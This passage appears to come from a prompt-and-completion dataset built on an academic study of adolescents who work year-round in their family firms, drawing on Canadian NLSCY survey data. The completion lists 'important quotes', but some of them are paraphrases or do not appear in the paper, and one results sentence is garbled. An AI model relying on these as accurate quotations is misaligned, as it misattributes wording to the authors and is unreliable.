2006). Moreover, while all adolescents are pulled by many external forces in different directions, those who work in their family firms are more likely able to manage their family time more efficiently by having the opportunity to spend time with family at work. Based on this logic, we argue that adolescents who have year-round involvement, defined as both during the school year and summer, in their family firms have higher psychological well-being than their peers. Hypothesis 2: Adolescents who have year-round involvement in their family firms report higher psychological well-being than all other adolescents. Method Data and Sample We identified a longitudinal data set well suited to exploring our questions called the NLSCY. The NLSCY was collected by Statistics Canada and Human Resources and Skills Development Canada. We used the longitudinal weights provided by Statistics Canada to account for attrition between cycles, which ensures the models are representative of the targeted population. As recommended by Statistics Canada, we conducted Stata BRR (balanced repeated replication) bootstrapping for all of our models. Employing this method helps ensure that our sample represents the target population and allows us to draw more generalizable conclusions from the results. The NLSCY focuses on child growth development from an ecological perspective. According to NLSCY user guides (e.g., Statistics Canada, 2010), survey content including subject areas, priorities, and survey questions were determined by (a) the NLSCY expert advisory group, which consists of researchers in the area of child development and the social sciences, (b) federal departments, and (c) representatives responsible for child development programs in the provinces and territories. As a result, several prevalidated scales were collected; and we predict two in our current study (Marsh & O’Neill, 1984; Radloff, 1977). For the purpose of this study, we used NLSCY data spanning 8 years, from when our subset of adolescents, representing over 570,000 Canadians who were 8 to 9 years old in 1994-1995 to when they were 16 to 17 years old in 2002-2003. In this study, we tested our theory using our primary independent variables of interest when adolescents were 14 to 15 years old to predict outcomes in later years, that is, when they were 16 to 17 years old. We also used various control variables from as early as ages 8 to 9, as detailed below. Measures Dependent Variables. Our questions lead to two sets of dependent variables for this study. We theorized that adolescents who have year-round involvement in their family firms have a better relationship with their parents and have higher psychological well-being than all other adolescents. For robustness, we operationalized these constructs in multiple ways as follows. General relationship with parent(s). We used a number of measures to capture the parent–adolescent relationship construct from different perspectives: the adolescents’ perception of how much parental affection they receive, how much the adolescents feel their parent(s) understand them, and the overall adolescent impression of their relationship with their parent(s). The questions pertaining to fathers and mothers were asked separately. Three measures captured adolescents’ perceptions of their relationship with each applicable parent. The questions were phrased as follows: (a) Affection— How much affection do you receive from your (mother/ father)? (b) Understanding—How well do you feel that your (mother/father) understands you? (c) Overall Relationship—Overall, how would you describe your relationship with your (mother/father)? The affection, understanding, and overall relationship variables were each coded with three ordered outcomes: 1 for very little/not at all, 2 for some and 3 for a great deal. We used a latent construct approach to measure parent–adolescent relationship. First, we created a general measure for relationship with father and a general measure for relationship with mother. Cronbach’s alpha for the father measures are .85 and .84 when adolescents are 14 to 15 years old and 16 to 17 years old, respectively. For the mother measures, they are .80 and .81. Although these measures originate from the NLSCY, the internal consistency of the scale is high. The measures were determined by domain experts and continue to be adopted in research regarding relations with parents (e.g., Myers, 2005) as well as caregivers (e.g., Flynn, Robitaille, & Ghazal, 2006). Furthermore, these studies exhibit similarly high levels of scale reliability. Our approach to this variable is similar to Bushnik’s (2005) article examining youth depressive symptoms and changes in relationships with parents and peers in that we use the same three parent measures.1 However, we then combined the measures as a single broader construct of overall relationship with parents by averaging all valid parent–adolescent relationship components (i.e., three components for single-parent families and six components otherwise). As a robustness check, we found that results using the broader construct were consistent with the separate measures for father and mother,2 and as such present the results using this broad latent construct for our sample measured both when adolescents are at ages 14 to 15 (T1) and again at the ages 16 to 17 cycle (T2). Psychological well-being. To capture adolescent psychological well-being, we used two measures, one of depression, the other of self-esteem. We measured depression with a version of the depression scale developed by Radloff (1977) with a Cronbach alpha of .82 based on T2 data (when adolescents were 16 to 17 years old). The scale sums 12 items, each ranging from 0 (infrequent prevalence) to 3 (frequent prevalence), to capture occurrence of depression symptoms as indicated by respondents within a 1-week span. The original depression scale, which comprised 20 questions, is also known as the Center for Epidemiologic Studies Depression Scale and continues to be widely used to measure symptoms of depression. The NLSCY’s reduced 12-item scale ranges between 0 and 36, with a higher score representing greater presence of depression symptoms. The full schedule of items is in Appendix A. Statistics Canada collected the depression scale in T2 (when our subset of adolescents were 16 to 17 years old), but not in T1 (when our subset of adolescents were 14 to 15 years old). Our second measure of psychological well-being is an index of self-reported self-esteem. Four self-esteem items were taken from the Marsh Self-Description Questionnaire (SDQ; Marsh & O’Neill, 1984) with a Cronbach alpha of .73 based on T1 data. The full-schedule Marsh SDQ measures multiple dimensions pertaining to an individual’s self-concept. We operationalized self-esteem using items from the SDQ’s General-Self Scale. The Marsh SDQ, including its underlying dimensions and (re)iterations (e.g., SDQ-I, SDQ-II, SDQ-III, and reduced versions thereof), are well established and have been applied broadly. The scale utilizes the sum of four items, each ranging on a Likert-type scale from 0 (mostly false) to 4 (mostly true), to denote general selfesteem. The scale ranges from 0 to 16, with a higher score indicating higher self-esteem. The full schedule of items is in Appendix B. The scale was collected in both T1 and T2 for our subset of adolescents. Independent Variables. When adolescents were 14 to 15 years old, they were asked what type of job they had during the previous summer, and since the beginning of the school year. Qualifier questions ascertained whether they had held any jobs during those two periods. Later, questions were designed to narrow down the specific type of employment. The questions were structured to elicit yes or no responses. For example, “Last summer, did you do any work: at your family’s farm or business (with or without pay)?” or “Since September 1, have you done any work: at your family’s farm or business (with or without pay)?” We categorized those respondents who answered “yes” to both the above questions as year-round family firm workers and distinguished them from other adolescents. We used this measure for all of our analyses to compare those adolescents who work in their family firm on a year-round basis with all other adolescents. The year-round engagement in the business, we believe, allows for the development of better relationships with parents as well as developing better psychological well-being. Control Variables. We controlled for general individual attributes such as gender, age, and race. Female is a dichotomous measure of gender, with male respondents coded as 0 and female respondents coded as 1. Age is a continuous measure of the respondents’ actual age at the time of their T1 interview and can differ from their survey age. That is, although the survey age at T1 is 14 to 15 years, the actual range for this variable spanned from 13 to 16 years. Though most respondents were either 14 or 15 years old at T1, interviews were not conducted on the same day corresponding to the day respondents were surveyed in the first cycle of the NLSCY (i.e., when they were 8 or 9 years old). Because respondents are not surveyed on the same day each time, a few will be 1 year younger or older from their formal survey age. Our third general individual attribute variable is race. White is a dichotomous measure of race, with White respondents coded as 1 and non-White respondents coded as 0. Number of siblings has been associated with perceived parent–adolescent relationships (Kidwell, 1981) and research shows that socioeconomic status (SES) influences children’s health, cognitive, and socioemotional outcomes (Bradley & Corwyn, 2002). As such, we also included four family-level variables to control for differences across families—number of siblings, single-parent family, parent(s) average age, and SES. All independent and control variables were identified when adolescents were 14 to 15 years old except for the SES and single-parent family variables, which were identified when adolescents were 12 to 13 years old. The latest cross-sectional SES captured in the survey for our age group was based on the SES of up to both parents from when the adolescents were 12 to 13 years old (Statistics Canada, 2010). Number of siblings was coded as a count of the number of siblings belonging to a respondent. The single-parent family variable was also dummy coded as 1 for families with only one parent, and 0 for two-parent families. The household SES variable was derived using up to five variables: household income (in 1000s), years of education (for up to two parents), and occupational prestige (for up to two parents) using a modified version of the scale developed by Pineo, Porter, and McRoberts (1977). The SES variable was only coded for two-parent families that answered at least 3 of the 5 questions, and for single-parent families that answered at least two of the three questions posed to them. Statistics Canada, in their coding of the SES variable, makes a final transformation by standardizing all components of the SES variable, and taking the mean of all available components (Statistics Canada, 2002). Two versions of the SES variable were derived in the NLSCY: longitudinal SES and cross-sectional SES. The differences between the two are minor; however, the former is recommended for examining within-household SES changes, while the latter is suited for between-household differences in SES (Statistics Canada, 2002). Therefore, we use the cross-sectional version of the SES variable during the time that respondents were 12 to 13 years old. As single-parent households naturally score lower on the SES scale, Statistics Canada recommends that researchers control for single-parent households when using the scale; and we followed this recommendation (Statistics Canada, 2010). In the same vein, we control for parent(s) average age because older parents are more likely to have higher SES (Statistics Canada, 2002). Additionally, we included a dummy variable for working in general in our models to tease out the difference in outcomes for those who have work experience. Those who worked at the ages of 14 to 15 years either during the summer or/and school year received a score of 1 on this variable, while those who did not were coded as 0. All respondents who indicated working for their family firm for any part of the year were therefore also coded as 1 along with those who had general work experience. Including this control variable allowed us to differentiate the effect of working in family firm from the effect of general work. In other words, because we have variables for family firm work as well as general work, any family firm work effects can be interpreted as occurring above and beyond that of general work effects. Indeed, the motivation for including this variable is central to our argument that year-round family firm involvement has benefits beyond those associated with working in general (e.g., Houshmand et al., 2014). While many family farms are family businesses, they possess unique characteristics that might be different than nonfarm family businesses (Astrachan & Shanker, 2003; Dumas, Dupuis, Richer, & St.-Cyr, 1995; Steier, 2001). Hence, we controlled for whether the family firm is farm family business or nonfarm family business. To differentiate family farm workers from other types, we created two dummy variables, one to capture whether at least one parent worked in agriculture and one to capture whether the family lived in a rural or urban region. We observed that both of these groups were more likely to be employed as year-round family workers than other adolescents. We therefore included the two dummy variables as control variables in our models. Finally, we control for a lagged measure of general relationship with parent(s) from when adolescents were 12 to 13 years old (T0). The coding of this variable is identical to our first dependent variable, with the distinction that it is coded from an earlier time period and used as a control for potential selection bias. That is, the likelihood for adolescents with better parent–adolescent relationships to self-select into the family firm.3 Risk Sets To rule out alternative explanations of the positive relationship between year-round family firm involvement and our dependent variables, we analyzed three samples of data. The first sample examines year-round family firm involvement compared with all other arrangements. However, it remains possible that our predicted yearround family firm involvement effects stem from family firm properties as opposed to actual involvement in the family firm. An alternative explanation for any significant effects can be attributed to the different properties associated with growing up in a family business environment. As a result, we used two subsamples of the first sample. These risk sets help address concerns around these alternative explanations, by examining adolescents that have the opportunity for—or, are at risk of— family firm involvement. In our initial models, we compare adolescents who have year-round work involvement in their family firm to all other adolescents by testing the models on a full population sample representing a population of roughly 500,000 adolescents. In addition to building models of the full population, as a robustness check to rule out selection bias explanations and also to unearth interesting distinctions between children of family firms, we defined two specific additional risk sets to identify those adolescents in our sample that potentially could have had an opportunity to work in their family firms. The first risk set consists of those who reported working for their family business or farm at the minimum of either in the summer or during the school year when they were between 14 and 15 years old. This set represents roughly 115,000 Canadians who were 14 to 15 years old in 2000- 2001. For this set, we compared our independent variable of year-round work involvement which is defined by working for the family firm in both time periods, against partial involvement in either fall or summer. By repeating the same analysis, we conducted using the full population on this particular risk set, we were able to tease out the effect of year-round involvement in family firm from partial involvement. The second risk set was those who had at least one parent who was self-employed. Being self-employed is not equivalent to running a family firm. However, this risk set serves as a proxy for adolescents who have access to working along with their parents when their parents are self-employed. This set represents roughly 120,000 Canadians during the same period. For this group, we compared year-round family firm work involvement with everyone else in the risk set. Results We used ordinary least squares regression in accordance with the provided design weights to examine both parts of our theory (i.e., the effect of year-round family firm involvement on adolescent relationship with parents, and the effect of year-round family firm involvement on adolescent psychological well-being). Ordinary least squares regression is appropriate because our dependent variables are continuous, while utilizing Statistics Canada’s provided design weights allows us to properly account for attrition and generalize our results to our population of interest (i.e., Canadians that were aged 8 to 9 years in 1994-1995). The design of the survey is such that a unique set of weights are provided for each time period. As a result, our modeling choices are limited and we develop separate models to predict our dependent variables for each time period. As part of Statistics Canada’s privacy restrictions, we are not allowed to report the exact sample size or correlations between raw variables. We followed Statistics Canada guidelines for researchers utilizing individual-level data through the secure Research Data Centre program and provide details on the target population weighted appropriately. For our analysis, the target population covered approximately 500,000 people. We evaluated the variance inflation factor values of all variables in all models and found no significant multicollinearity problems (variance inflation factor < 1.28). Table 1 presents the full results of the regressions on general relationship with parents captured when adolescents are 14 to 15 years old (T1), and again when they are 16 to 17 years old (T1 + 2 years later). The first model includes only the control variables, whereas the following model adds the year-round involvement in the family firm dummy variable. In the subsequent set of models, which look at our dependent variable in T2, we similarly start with a model with only control variables, then add our independent variable of interest. We highlight the year-round involvement in the family firm variable in bold. Tables 2 and 3 present the results for the risk sets. Table 2 illustrates the findings for those adolescents who had indicated that they had some experience working in the family firm during that year, whereas Table 3 depicts those who had at least one self-employed parent. As seen in these tables, when adolescents are 14 to 15 years old, year-round involvement in the family firm generally has a statistically significant positive relationship with adolescents’ general relationship with their parents. Our risk set analyses in Table 2 show those that work for their family firm throughout the year report having a better relationship with parents, compared with those that work for family during only part of the year. Similarly, as shown in Table 3, the effects are positive and significant when looking at the set of respondents who have at least one self-employed parent showing those who have year-round involvement in their family firm experience better relationship with their parents than those who have a self-employed parent but do not have year-round work involvement at the family firm. Two years later, we find a consistent pattern. In the full population, general parental relationships involvement in their family firm. Looking at the size of the coefficients, we do observe an increase from T1 to T2 in all the models of full population and risk sets. By taking this into account, we infer that while working in a family firm appears to be a reliable way to initiate a rich parent–adolescent relationship, the positive relationships with parents continue to strengthen into the future. Together, these findings provide support for Hypothesis 1 that year-round involvement in the family firm leads to better relationship with parents. To gain perspective on the psychological outcome part of our theory, we used two measures: self-esteem and depression, and found empirical support for each. Table 4 presents the full results of the regression on depression. Depression data were collected by Statistics Canada in T2 when adolescents were 16 to 17 years old. As such, we show the analysis for T2 when adolescents were 16 to 17 years old. Self-esteem, on the other hand, was measured in both T1 and T2. Tables 5 to 7 present the results on self-esteem for the full sample and risk sets, respectively. We find consistent statistically significant effects for both measures when working year round in a family firm in T1, though for T2 only. There is only a marginally significant (p < .10) effect for working year round in the family firm in the full population model predicting self-esteem in T1. Both risk sets predicting self-esteem in T1 do not have statistically significant effects. These combined results could suggest that working in a family firm has positive and proximal (i.e., during T1) effects on self-esteem independent of the level of involvement (i.e., year-round or partial); although the evidence for such an effect is only marginal. Working year round in the family firm shows a negative relationship with depression, and a positive relationship with self-esteem, during T2. This pattern of results for the self-esteem models (significant effect in T2, lack of a consistent effect in T1) suggests that there may be a latent effect for working in the family firm year round at the ages of 14 to 15 years that manifests over time. The results of the models predicting general relationship with parents, with their larger effect sizes in T2, also supports the interpretation that year-round involvement of adolescents in the family firm can establish a gradually manifesting path toward desirable outcomes including a better relationship with parents as well as psychological well-being. Together, these findings provide support for Hypothesis 2 that year-round involvement in the family firm yields higher psychological well-being.","completion":"1. \\"Working in a family firm at a young age, as opposed to a nonfamily firm, likely influences adolescent development differently.\\" 2. \\"Teenagers who work for their parents may have a better relationship with them compared to those who work for strangers.\\" 3. \\"Adolescents who have year-round involvement in their family firms report better relationships with their parents than all other adolescents.\\" 4. \\"Year-round involvement in the family firm leads to better relationships with parents and higher psychological well-being for adolescents.\\" 5. \\"Working in a family firm appears to be a reliable way to initiate a rich parent-adolescent relationship.\\""},{"prompt":"WHat are important quotes from the text? Introduction The ecological theory of human development has mixed findings which suggest adolescent work has both negative and positive impacts on adolescent development (Zimmer-Gembeck & Mortimer, 2006). The mixed findings may partially be due to the research ignoring an important source of work context heterogeneity which has theoretical reasons for being quite different—the family firm. Working in a family firm at a young age, as opposed to a nonfamily firm, likely influences adolescent development differently. This is a critical theoretical gap in the literature as the prevalence of family firms around the globe, including those of developed countries (Arregle, Hitt, Sirmon, & Very, 2007; La Porta, Lopez-de-Silanes, & Shleifer, 1999), indicates that a large number of parents have the option of hiring their own children, especially their own adolescents in their own business. One important decision these parents make is whether to involve the next generation early on in the family business. Family legacy has a significant influence on the decision-making process of family firms (Hammond, Pearson, & Holt, 2016) such that the choosing and developing of a successor, while considering parent– child relationship quality, is one of the most important decisions that family business owners make (Cater & Justis, 2009). Care for the next generation prompts many family owners to hire their adolescents into the business. In developed countries, many adolescents end up working in their family firms at a young age. For example, according to nationally representative data gathered from the Youth in Transition Survey (Statistics Canada, 2012), 45% of Canadian adolescents who were 15 years old as of December 1999 reported having worked in their family business at one point. An important question thus emerges about the consequences of working in the family business on adolescents.With such a high percentage of adolescents in society having worked in a family firm, and given adolescence is a critical stage in developing one’s identity (Mortimer, 2003; Mortimer, Lam, & Lee, 2014), we must better understand the implications of adolescents working in their family business on the adolescent’s psychological well-being and relationship with parents. There has been a debate in the family studies literature regarding the impact of general work on adolescent development and relationships with parents. While some argue this influence is harmful (Greenberger & Steinberg, 1986) noting that this kind of work may lead to stress and a lower level of family commitment (Steinberg, Grennberger, Ruggiero, Garduque, & Vaux, 1982), others posit positive outcomes, such as a greater sense of independence (Mortimer & Shanahan, 1994). Recently, the literature has started to recognize the heterogeneity of outcomes among adolescents on the transition into the working world. Vuolo, Mortimer, and Staff (2014) recently started to disentangle these trajectories in terms of work identity outcomes categorizing the outcomes into “successful” and “floundering” based on a variety of characteristics including work experiences during transitional years. Mortimer and her colleagues (Mortimer, 2003; Mortimer, Kim, Staff, & Vuolo, 2016) start to introduce psychological outcomes such as self-efficacy, finding that “high-quality” employment is linked to increased self-efficacy during these transitional years. The impact on broader psychological well-being and the relationship with parents still needs further disentanglement. Additionally, these studies have been limited to general business work placements, and the dynamics are likely to differ when working with family members due to the inherent nature of the business family overlap. Working with family members is likely to affect the quality of the work experience dramatically, quite possibly providing higher quality employment experiences overall for adolescents. The psychological and relationship impacts of adolescent work become more complex when the work context is the family firm, where familial relationships are particularly affected due to the overlap of family and work settings. Empirical evidence in general settings suggests work has a negative influence on parent–adolescent relationships. One key explanation highlighted in the family studies literature is that working reduces the amount of time adolescents spend with their families (Ashbourne & Daly, 2010). However, in the context of the family firm, adolescents are able to spend more time with their parents at work and be exposed to a unique work environment. Since the underlying theoretical time overlap assumptions are different in the family business context, we expect that in the family business context, the impact of adolescent work may be different than suggested in the general work context typically used in the family studies literature. In other words, working in a family business may be an important source of heterogeneity in the quality of the work experience. This study is the first of its kind to explore this important relationship and make a direct comparison between adolescents who work for nonfamily firms with those who work in their family business. The specific research question we explore in this article centers on the consequences of adolescents working in their family business. We focus our attention on how working in this context influences adolescent development and the parent–child relationship differently. Finally, for those children who are likely to find themselves working in their family-owned firm, we empirically test the best strategy for improving psychological and family outcomes for adolescents. We construct the article as follows. First, drawing on ecological theories of human development, we briefly theorize about the consequences of an adolescent working along with their parents on two important outcomes: parent–adolescent relationships and adolescent wellbeing. We then use the National Longitudinal Survey of Children and Youth (NLSCY), a unique Canadian longitudinal data set well suited to shedding light on this question. To ensure the robustness of our findings, we use different operationalizations of our primary variables of interest and, due to the mixed definitions of family business in the literature, define a variety of business family risk sets. Finally, we discuss our findings and the managerial implications for family firm managers. The Consequences of Adolescents Working in Their Family Business The ecological theory of human development (Bronfenbrenner, 1979) helps understand the spillover between work and family settings and how experience in one setting influences the experience in another setting. The theory, specifically, delineates different types of systems that shape individual development. The lowest level is the micro system in which individuals function in different settings such as school, family, and work. The micro system is concerned with how ties developed in these settings shape the individual and ultimately his or her experience. The next system is the meso system in which the settings found in the micro system are assumed to interact with each other. Their interactions make it possible for relationships formed in one setting to influence the individual’s experience in other settings (Bronfenbrenner, 1979). These settings become more interconnected within the context of family firms. Family businesses have unique characteristics that entail both family and business life and require more nuanced theorizing to study (Chua, Chrisman, & Steier, 2003; Gersick, Lansberg, Desjardins, & Dunn, 1999; Sirmon & Hitt, 2003). They possess distinct traits from nonfamily firms such as the influence of family relations on simultaneous roles and shared identity (Tagiuri & Davis, 1996). This overlap of both roles and identity creates a need to modify broader theory when considering such contexts. The decision-making process of parents as the owners and managers of family firms to a significant extent is shaped by their intention and preference in perpetuation of their family dynasty (e.g., Jaffe & Lane, 2004; Lambrecht, 2005) and keeping family legacy (Hammond et al., 2016). Families have a varying degree of preference for different types of legacy—biological, material, and social. All these types of family legacy could serve as a source of motivation for involving the next generation in the business. However, given those families with a higher biological legacy orientation have a preference for passing the business through the family’s bloodline, they are more likely to consider employing their adolescents in the business. Prior studies suggest that concerns for keeping biological legacy influence how leaders of family firms make strategic decisions (e.g., Gersick, Davis, Hampton, & Lansberg, 1997; Hammond et al., 2016). We, therefore, deduce that the business decision to hire familial adolescents implies parents and adolescents spending more time with each other as well as adolescents working in a unique environment. In the family business context, parents as managers and owners pay attention to providing adolescents with a different type of working experience than their peers would receive from working for strangers. As Hammond et al. (2016) noted, “parental altruism, which represents a trait linking the parents’ welfare to their children’s welfare, is grounded in the notion that parents view their children as an extension of themselves” (p. 1216). Under such context, as family business owners, while spending more time with their children, parents also have incentive to provide their adolescents a unique working environment that in turn affects the adolescent’s relationship with them as well as the adolescent’s psychological well-being. Parent–Adolescent Relationship Adolescence is a critical stage in one’s life (Hall, 1904) and the work experience during this phase conveys a developmental importance both in the short and long run (Mortimer, 2010). An important consequence of work is the mark it leaves on the type of relationship one develops with her parents. Family studies researchers have studied this relationships by making an underlying assumption that adolescent work takes time away from family time (e.g., Ashbourne & Daly, 2010; Steinberg & Dornbusch, 1991). In fact, many of the studies in the literature highlight the importance of the role time plays in the parent–child relationship. Time is a tool families use to craft and shape family ties (Gillis, 1996). In families where both parents and children work, family members may be forced to sacrifice spending time with each other to meet other demands arising from work obligations, which may give rise to work–family conflict for both parents and adolescents. The value of time becomes even greater for adolescents, compared with younger children, as they have less access to family time due to their external activities such as staying out late with friends and working at jobs (Larson, Richards, Moneta, Holmbeck, & Duckett, 1996). While these findings are not conclusive, some studies suggest that reducing the amount of time family members spend with one another may weaken family ties (e.g., Mortimer & Shanahan, 1994; Steinberg & Dornbusch, 1991). The family–work literature also posits that family and work domains influence each other. While empirical evidence supports the notion that the number of work hours is negatively related to work– family balance (Valcour, 2007), it is driven by the tradeoff between working and spending time at home that causes distress to individuals rather than the absolute number of working hours (Barnett & Gareis, 2000). Furthermore, to the extent to which work interferes with family, the family provides less emotional support (Adams, King, & King, 1996)The reduction of time adolescents spend with their families, not surprisingly, is highlighted as one explanation for more negative outcomes associated with adolescents working (Ashbourne & Daly, 2010). These studies, however, do not take into account the nature of the relationship of the employer with the adolescents. While many of these studies highlight the importance of the role time plays in the parent–child relationship, they do not differentiate between who the adolescents are spending time with at work—a stranger or a relative. In family firms, spending time at work or with family is not mutually exclusive. We therefore expect that in the family firm context, the impact of working on adolescent behaviors may be different than currently suggested in the family studies literature. Within the context of family firms, the involvement of adolescents in the business carries its own weight. Family businesses are viewed by many family members as a form of collective wealth that provides utility to the members and while contributing to it is usually encouraged, disengagement from it may be frowned on for both financial and emotional reasons (Eckrich & Loughead, 1996). Because family members view working together and spending time together as advantageous to running a family firm (Cole, 2000), they may be disappointed when some members choose not to engage fully in the firm. Moreover, family firms count on the human capital represented by their members; and given that the size of families is shrinking, these resources have become more valuable (Aldrich & Cliff, 2003). Those family members who do not facilitate running the business may damage their relationships with prominent family members, in this case their father and mother. Part of this unique work experience is that the nature of work contribution also differs for adolescents who work in their family firms than those who work for other people. Those who work for their family firms directly contribute to their family business and hence their relationship with their parents may be more directly and positively influenced. The work setting also allows adolescents to establish new types of ties, in addition to familial ones. Not only can they learn more about their family firm and gain appreciation for the work their family puts into the business they might be able to better express themselves in new dimensions (Ward, 2004). Finally, adolescents who work in their family firms are exposed to unique work experiences that shape them differently than their counterparts. For example, one study showed that those who work in their family business are more likely in the future to enjoy richer career networking and select themselves into organizations with more fitting characteristics than other adolescents who work for a nonfamily member (Houshmand, Seidel, & Ma, 2014). The experience in the work role could spill over to the family role through both the affective and instrumental paths which makes the family role more positive or negative depending on the experience (Greenhaus & Powell, 2006). Consequently, we expect a richer work experience and a positive working relationship between parents and adolescents at work to favorably influence general parent–adolescent relationships. Spending time with family members coupled with the other reasons discussed previously such as establishing new types of connections, finding new avenues to express themselves, and contributing to the family business all suggest that adolescents develop better relationships with their parents when they work consistently in their family firms. Hypothesis 1: Adolescents who have year-round involvement in their family firms report a better relationship with their parents than all other adolescents. Psychological Well-Being Work that is dissatisfying or stressful can impair the psychological well-being of adolescents. Stress and depression in the workplace is often the result of feeling responsible for outcomes beyond one’s control (Shanahan, Finch, Mortimer, & Ryu, 1991). Work that interests and challenges the worker can lead to positive psychological outcomes. For example, boys reported a greater sense of well-being when assigned interesting and complex work; girls reported greater self-esteem and well-being when they perceived school and work settings to be mutually supportive (Mortimer, Finch, Shanahan, & Ryu, 1992). Parents are altruistic toward their children and family members of a family business also display altruistic behavior toward each other (Schulze, Lubatkin, & Dino, 2003). Families, therefore, have incentives to provide positive and developmental working conditions for their own children. To keep family and family firm legacy, parents groom the next generation as their business successors (e.g., Hammond et al., 2016). We thus argue that in family firms, adolescents are more likely to have access to developmental work assignments than in situations where they work for strangers. They are also more likely to receive support from other settings such as school and family for the work they are doing at their family firms. A study of children growing up in the Great Depression concluded that those who helped their financially troubled families by either working within or outside the home had a higher level of self-confidence than those who did not have the same opportunity (Elder & Rockwell, 1979). In the same vein, we predict that due to the better working conditions and the ability to financially help their family, those adolescents who have year-round involvement in their family firms develop greater psychological well-being. Taking into account the role time plays, compared with their younger siblings, adolescents have fewer opportunities to spend time with their family and may also face work–family conflict due to their scarcity of time; which becomes divided among school, friends, work, and family (Larson et al., 1996). Higher level of work–family conflict is positively associated with psychological distress and depression for adults (Frone, 2000; Hammer, Neal, Newsom, Brockwood, & Colton, 2005). Similarly, adolescents facing time constraints and higher levels of work–family conflict may experience lower psychological well-being. Working adolescents in family firms, however, have more opportunities to spend time with their families than their counterparts. They, additionally, have more spare time to allocate to other settings such as social and school. Therefore, these adolescents are better able to handle environmental demands and experience less distress. When parents hire their adolescents into the business, they provide a unique work environment to adolescents. The unique work environment stems from the familial ties these young workers have with their employers (Houshmand et al., 2014) who are more likely to encourage the youngsters to engage in more interesting and complex tasks than other potential employers at odd jobs elsewhere. This positive experience in the work role could spill over to other settings (Greenhaus & Powell, 2006). Moreover, while all adolescents are pulled by many external forces in different directions, those who work in their family firms are more likely able to manage their family time more efficiently by having the opportunity to spend time with family at work. Based on this logic, we argue that adolescents who have year-round involvement, defined as both during the school year and summer, in their family firms have higher psychological well-being than their peers. Hypothesis 2: Adolescents who have year-round involvement in their family firms report higher psychological well-being than all other adolescents. Method Data and Sample We identified a longitudinal data set well suited to exploring our questions called the NLSCY. The NLSCY was collected by Statistics Canada and Human Resources and Skills Development Canada. We used the longitudinal weights provided by Statistics Canada to account for attrition between cycles, which ensures the models are representative of the targeted population. As recommended by Statistics Canada, we conducted Stata BRR (balanced repeated replication) bootstrapping for all of our models. Employing this method helps ensure that our sample represents the target population and allows us to draw more generalizable conclusions from the results. The NLSCY focuses on child growth development from an ecological perspective. According to NLSCY user guides (e.g., Statistics Canada, 2010), survey content including subject areas, priorities, and survey questions were determined by (a) the NLSCY expert advisory group, which consists of researchers in the area of child development and the social sciences, (b) federal departments, and (c) representatives responsible for child development programs in the provinces and territories. As a result, several prevalidated scales were collected; and we predict two in our current study (Marsh & O’Neill, 1984; Radloff, 1977). For the purpose of this study, we used NLSCY data spanning 8 years, from when our subset of adolescents, representing over 570,000 Canadians who were 8 to 9 years old in 1994-1995 to when they were 16 to 17 years old in 2002-2003. In this study, we tested our theory using our primary independent variables of interest when adolescents were 14 to 15 years old to predict outcomes in later years, that is, when they were 16 to 17 years old. We also used various control variables from as early as ages 8 to 9, as detailed below. Measures Dependent Variables. Our questions lead to two sets of dependent variables for this study. We theorized that adolescents who have year-round involvement in their family firms have a better relationship with their parents and have higher psychological well-being than all other adolescents. For robustness, we operationalized these constructs in multiple ways as follows. General relationship with parent(s). We used a number of measures to capture the parent–adolescent relationship construct from different perspectives: the adolescents’ perception of how much parental affection they receive, how much the adolescents feel their parent(s) understand them, and the overall adolescent impression of their relationship with their parent(s). The questions pertaining to fathers and mothers were asked separately. Three measures captured adolescents’ perceptions of their relationship with each applicable parent. The questions were phrased as follows: (a) Affection— How much affection do you receive from your (mother/ father)? (b) Understanding—How well do you feel that your (mother/father) understands you? (c) Overall Relationship—Overall, how would you describe your relationship with your (mother/father)? The affection, understanding, and overall relationship variables were each coded with three ordered outcomes: 1 for very little/not at all, 2 for some and 3 for a great deal. We used a latent construct approach to measure parent–adolescent relationship. First, we created a general measure for relationship with father and a general measure for relationship with mother. Cronbach’s alpha for the father measures are .85 and .84 when adolescents are 14 to 15 years old and 16 to 17 years old, respectively. For the mother measures, they are .80 and .81. Although these measures originate from the NLSCY, the internal consistency of the scale is high. The measures were determined by domain experts and continue to be adopted in research regarding relations with parents (e.g., Myers, 2005) as well as caregivers (e.g., Flynn, Robitaille, & Ghazal, 2006). Furthermore, these studies exhibit similarly high levels of scale reliability. Our approach to this variable is similar to Bushnik’s (2005) article examining youth depressive symptoms and changes in relationships with parents and peers in that we use the same three parent measures.1 However, we then combined the measures as a single broader construct of overall relationship with parents by averaging all valid parent–adolescent relationship components (i.e., three components for single-parent families and six components otherwise). As a robustness check, we found that results using the broader construct were consistent with the separate measures for father and mother,2 and as such present the results using this broad latent construct for our sample measured both when adolescents are at ages 14 to 15 (T1) and again at the ages 16 to 17 cycle (T2). Psychological well-being. To capture adolescent psychological well-being, we used two measures, one of depression, the other of self-esteem. We measured depression with a version of the depression scale developed by Radloff (1977) with a Cronbach alpha of .82 based on T2 data (when adolescents were 16 to 17 years old). The scale sums 12 items, each ranging from 0 (infrequent prevalence) to 3 (frequent prevalence), to capture occurrence of depression symptoms as indicated by respondents within a 1-week span. The original depression scale, which comprised 20 questions, is also known as the Center for Epidemiologic Studies Depression Scale and continues to be widely used to measure symptoms of depression. The NLSCY’s reduced 12-item scale ranges between 0 and 36, with a higher score representing greater presence of depression symptoms. The full schedule of items is in Appendix A. Statistics Canada collected the depression scale in T2 (when our subset of adolescents were 16 to 17 years old), but not in T1 (when our subset of adolescents were 14 to 15 years old). Our second measure of psychological well-being is an index of self-reported self-esteem. Four self-esteem items were taken from the Marsh Self-Description Questionnaire (SDQ; Marsh & O’Neill, 1984) with a Cronbach alpha of .73 based on T1 data. The full-schedule Marsh SDQ measures multiple dimensions pertaining to an individual’s self-concept. We operationalized self-esteem using items from the SDQ’s General-Self Scale. The Marsh SDQ, including its underlying dimensions and (re)iterations (e.g., SDQ-I, SDQ-II, SDQ-III, and reduced versions thereof), are well established and have been applied broadly. The scale utilizes the sum of four items, each ranging on a Likert-type scale from 0 (mostly false) to 4 (mostly true), to denote general selfesteem. The scale ranges from 0 to 16, with a higher score indicating higher self-esteem. The full schedule of items is in Appendix B. The scale was collected in both T1 and T2 for our subset of adolescents. Independent Variables. When adolescents were 14 to 15 years old, they were asked what type of job they had during the previous summer, and since the beginning of the school year. Qualifier questions ascertained whether they had held any jobs during those two periods. Later, questions were designed to narrow down the specific type of employment. The questions were structured to elicit yes or no responses. For example, “Last summer, did you do any work: at your family’s farm or business (with or without pay)?” or “Since September 1, have you done any work: at your family’s farm or business (with or without pay)?” We categorized those respondents who answered “yes” to both the above questions as year-round family firm workers and distinguished them from other adolescents. We used this measure for all of our analyses to compare those adolescents 